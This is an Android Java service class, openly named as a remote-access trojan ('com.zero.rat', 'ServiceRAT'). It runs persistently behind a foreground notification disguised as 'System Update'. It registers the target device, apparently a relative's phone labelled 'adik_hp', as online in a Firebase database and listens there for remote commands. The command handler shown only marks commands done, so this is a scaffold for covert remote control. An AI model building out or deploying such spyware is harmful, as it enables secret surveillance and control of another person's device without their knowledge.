package com.zero.rat;
import android.app.*;
import android.content.Intent;
import android.os.*;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import com.google.firebase.database.*;

public class ServiceRAT extends Service {
    private DatabaseReference dbRef;
    @Override public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("rat", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
            Notification n = new NotificationCompat.Builder(this, "rat").setContentTitle("System Update").setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, n);
        }
        dbRef = FirebaseDatabase.getInstance().getReference();
        dbRef.child("status").child("adik_hp").child("online").setValue(true);
        
        dbRef.child("commands").child("adik_hp").addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists() && "pending".equals(snapshot.child("status").getValue(String.class))) {
                    dbRef.child("commands").child("adik_hp").child("status").setValue("done");
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }
    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
}
